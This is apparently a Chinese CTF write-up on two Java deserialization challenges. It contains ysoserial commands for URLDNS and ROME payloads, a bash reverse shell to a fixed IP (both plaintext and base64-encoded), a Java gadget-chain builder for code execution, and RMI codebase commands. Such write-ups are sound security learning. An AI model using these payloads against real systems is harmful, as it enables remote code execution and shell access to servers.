---
title: java题目
date: 2022-03-26 16:09:58
tags:
      - java
---



## [网鼎杯 2020 朱雀组]Think Java

<!--more-->

> 血的教训
>
> 千万不要用powershell使用ysoserial,生成的payload直接乱码呜呜



本题起初找不到入口,看的别人的wp做的,也学习到了很多东西

生成URLDNS payload

`java -jar ysoserial.jar URLDNS "http://3s8kl8.dnslog.cn" > url.bin`

按照其token规则进行编码

```python
import base64
file = open(r"F:\TOOLS\ser\url.bin","rb")
now = file.read()
ba = base64.b64encode(now)

print("Bearer "+ba.decode('unicode_escape'))
file.close()
```

在`/common/user/current`发送

![image-20220326161131867](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220326161131867.png)

dnslog收到请求

![image-20220326161147299](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220326161147299.png)

`bash -i >& /dev/tcp/121.40.113.226/5555 0>&1`反弹shell的命令要进行一次转换

![image-20220326162201101](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220326162201101.png)



接着生成反弹shell的反序列化字节码文件

`java -jar ysoserial.jar ROME "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDAuMTEzLjIyNi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}" > shell.bin`

反弹shell尝试了两次才成功

## ezgaeget（东华杯）

本题是一道关于java反序列化的题目

题目有一个jar包,通过Java Decompiler打开,查看里面的类,发现一个类ToStringBean,它的toString方法不但能从字节码加载类,并且还能帮助类继续实例化,所以这就是代码执行的地方了,想办法将ClassByte换成恶意类的字节码即可

![image-20220318151601653](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220318151601653.png)

并且在IndexController这个Controller类中发现了能进行反序列化的地方

![image-20220318151834640](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220318151834640.png)

java中ObjectInputStream.readObject其实就是反序列化的方法



所以现在思路确定下来,首先构造恶意类,让其中的readObject可以调用参数的toString方法

```java
public static void main(String[] args) throws Exception{

        //首先通过字节码获取对应类的字节码
        byte[] bytes= Files.readAllBytes(Paths.get("E:\\javaSecurity\\cc\\target\\test-classes\\test.class"));
        ToStringBean toStringBean = new ToStringBean();
        Class<? extends ToStringBean> toStringBeanClass = toStringBean.getClass();
        Field classByte = toStringBeanClass.getDeclaredField("ClassByte");
        classByte.setAccessible(true);
        classByte.set(toStringBean,bytes);
        //现在代码执行的地方已经封装好了,接下来就是构造反序列化时候能调用toString,恰好BadAttributeValueExpException的readObject会调用toString

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        //此处有个坑,就是BadAttributeValueExpException的构造方法会先执行toString,所以通过反射在实例化后再次修改
        Class<? extends BadAttributeValueExpException> badAttributeValueExpExceptionClass = badAttributeValueExpException.getClass();
        Field val = badAttributeValueExpExceptionClass.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,toStringBean);
        //构造完成,接下来只需要构造base64编码的字节流
        
        ByteOutputStream byteOutputStream=new ByteOutputStream();
        ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteOutputStream);
        objectOutputStream.writeUTF("gadgets");
        objectOutputStream.writeInt(2021);
        objectOutputStream.writeObject(badAttributeValueExpException);
        byte[] bytes1=byteOutputStream.toByteArray();
        
        System.out.println(Tools.base64Encode(bytes1));
       
    }
```

起初没有保证序列化之前的包名一致,导致无法正常反序列化,反序列化的时候必须保证反序列化的类所在的包名一样

还有一个坑点,就是base64在传的时候,记得先urlencode一次,防止将+当成空格去传,但是解码的时候又把空格当成base64来解码,所以会报`Illegal base64 character 20`错误

传入data为打印出的字符串,成功执行代码



`java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://121.40.113.226:5555/ RMIClient`



```
java -Djava.rmi.server.hostname=121.40.113.226 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer

```

